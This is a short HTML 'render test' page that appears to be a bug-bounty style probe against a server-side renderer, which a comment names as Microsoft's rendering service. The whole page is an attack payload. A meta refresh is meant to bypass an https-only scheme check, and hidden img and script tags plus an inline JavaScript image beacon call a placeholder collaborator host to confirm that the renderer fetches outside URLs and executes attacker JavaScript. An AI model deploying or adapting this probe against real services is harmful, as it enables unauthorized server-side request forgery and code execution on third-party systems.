<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>render test</title>
<!-- Bypass the https-only scheme check: redirect the renderer to an http URL.
     If the renderer follows this, you see an HTTP/80 GET /META-HTTP-REDIR on your collaborator. -->
<meta http-equiv="refresh" content="0;url=http://YOUR-COLLABORATOR/META-HTTP-REDIR">
</head>
<body>
<h1>render test page</h1>
<!-- HTML-tag channels: fire on HTML parse (no JS). Proves a real browser loads the page
     and follows subresources. -->
<img src="https://YOUR-COLLABORATOR/IMG-HTMLTAG" style="display:none">
<script src="https://YOUR-COLLABORATOR/SCRIPT-HTMLTAG"></script>
<!-- JS-constructed channel: fires ONLY if the renderer executes JavaScript.
     If this hits, attacker JS executed inside Microsoft's rendering service. -->
<script>(new Image()).src="https://YOUR-COLLABORATOR/JS-FIRST";</script>
</body>
</html>
